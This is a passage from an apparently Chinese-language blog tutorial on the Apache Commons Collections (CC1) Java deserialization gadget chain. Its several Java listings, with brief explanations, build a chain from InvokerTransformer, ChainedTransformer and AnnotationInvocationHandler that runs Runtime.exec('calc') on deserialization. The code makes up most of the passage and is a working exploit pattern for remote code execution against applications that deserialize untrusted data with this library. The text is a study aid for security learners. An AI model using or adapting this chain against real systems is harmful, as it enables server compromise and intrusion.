class="variable">annotationConstructor</span> <span class="operator">=</span> annotationClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Override.class, transformdMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么再让我们执行一次 它没有成功 </p><p>那么问题出在哪里了呢</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>Runtime类并没有Serializable接口 所以无法进行序列化和反序列化</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651832445-20317b70-a0ea-4741-89d1-4938e8510062.png" alt="img"></p><p>所以我们需要通过反射获得它的原型类 原型类Class具有Serializable接口的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651916837-e8b8d76e-9f07-4fd5-90eb-e9151d360092.png" alt="img"></p><p>它有一个<code>getRuntime()</code>方法  注意一下这里是没有参数传入的</p><p>可以看到直接返回一个Runtime对象 我们可以利用它来反射调用 </p><p> 也就是单列模式<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695652059596-2a448c28-832c-4a01-ac74-9f1d31bdb344.png" alt="img"></p><p>获得可以反序列化的对象和exec方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695653868021-b3411c20-86c3-4d6f-9c6a-663813b39b08.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t.dubug;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.dsig.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeReflection</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">rReflectionMethod</span> <span class="operator">=</span> runtimeReflection.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//获得对象</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) rReflectionMethod.invoke(<span class="literal">null</span>, <span class="literal">null</span>);<span class="comment">//静态方法无对象 无参方法</span></span><br><span class="line">        <span class="comment">//再来获取exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeReflection.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////        Class&lt;? extends Runtime&gt; runtiomeClass = r.getClass();</span></span><br><span class="line"><span class="comment">////        Method runtimeMethod = runtiomeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">////        Object invokerObject = runtimeMethod.invoke(r, &quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        //rlInvokerTransformer.transform(r);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); //先创建一个map对象</span></span><br><span class="line"><span class="comment">//        map.put(&quot;Z1d10t&quot;,&quot;Z1d10t&quot;);//任意填</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);</span></span><br><span class="line"><span class="comment">////        for(Map.Entry Entry:transformdMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">////            Entry.setValue(r); //注意我们这里都是在传一个对象</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line"><span class="comment">//        Class&lt;?&gt; annotationClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.ser&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>优化为我们一开始的<code>InvokerTransformer</code>调用形式</p><p>这里直接给transform穿了一个<code>Runtime.class</code> 这是一个类对象 本质上也是对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t.dubug;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.dsig.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//改为InvokerTransformer调用形式</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">rReflectionMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">        ,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);<span class="comment">//Runtime.class注意这里用法</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(rReflectionMethod);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeReflection</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="comment">//Method rReflectionMethod = runtimeReflection.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">        <span class="comment">//获得对象</span></span><br><span class="line">        <span class="comment">//Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法</span></span><br><span class="line">        <span class="comment">//再来获取exec方法</span></span><br><span class="line">        <span class="comment">//Method exec = runtimeReflection.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////        Class&lt;? extends Runtime&gt; runtiomeClass = r.getClass();</span></span><br><span class="line"><span class="comment">////        Method runtimeMethod = runtiomeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">////        Object invokerObject = runtimeMethod.invoke(r, &quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        //rlInvokerTransformer.transform(r);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); //先创建一个map对象</span></span><br><span class="line"><span class="comment">//        map.put(&quot;Z1d10t&quot;,&quot;Z1d10t&quot;);//任意填</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);</span></span><br><span class="line"><span class="comment">////        for(Map.Entry Entry:transformdMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">////            Entry.setValue(r); //注意我们这里都是在传一个对象</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line"><span class="comment">//        Class&lt;?&gt; annotationClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.ser&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是一个套一个的形式 有点套娃 那么有没有一个类直接帮我们进行套娃调用呢 </p><p>答案是有的<code>ChainedTransformer</code>类</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695655664035-d609bad6-2da1-4e83-9e60-013efaa89ca6.png" alt="img"></p><p>构造函数我们需要将我们链式调用的内容数组传进去 然后它的<code>transform()</code>就可以帮我们进行链式调用</p><p>真是太酷啦</p><p>最后优化后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t.dubug;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.dsig.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//改为InvokerTransformer调用形式</span></span><br><span class="line"><span class="comment">//        Method rReflectionMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class</span></span><br><span class="line"><span class="comment">//        ,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);//Runtime.class注意这里用法</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;null, null&#125;).transform(rReflectionMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                        ,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);<span class="comment">//Runtime.class只有这里是我们可控 其他都是套娃 这里需要理解</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Class runtimeReflection = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method rReflectionMethod = runtimeReflection.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">        <span class="comment">//获得对象</span></span><br><span class="line">        <span class="comment">//Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法</span></span><br><span class="line">        <span class="comment">//再来获取exec方法</span></span><br><span class="line">        <span class="comment">//Method exec = runtimeReflection.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//exec.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////        Class&lt;? extends Runtime&gt; runtiomeClass = r.getClass();</span></span><br><span class="line"><span class="comment">////        Method runtimeMethod = runtiomeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">////        Object invokerObject = runtimeMethod.invoke(r, &quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        //rlInvokerTransformer.transform(r);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); //先创建一个map对象</span></span><br><span class="line"><span class="comment">//        map.put(&quot;Z1d10t&quot;,&quot;Z1d10t&quot;);//任意填</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);</span></span><br><span class="line"><span class="comment">////        for(Map.Entry Entry:transformdMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">////            Entry.setValue(r); //注意我们这里都是在传一个对象</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line"><span class="comment">//        Class&lt;?&gt; annotationClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.ser&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得要将map这里稍加修改一下 对象变了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656279030-c5c4fa98-dd90-4c9b-91e2-838323fea8d0.png" alt="img"></p><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>记得35行要注释掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 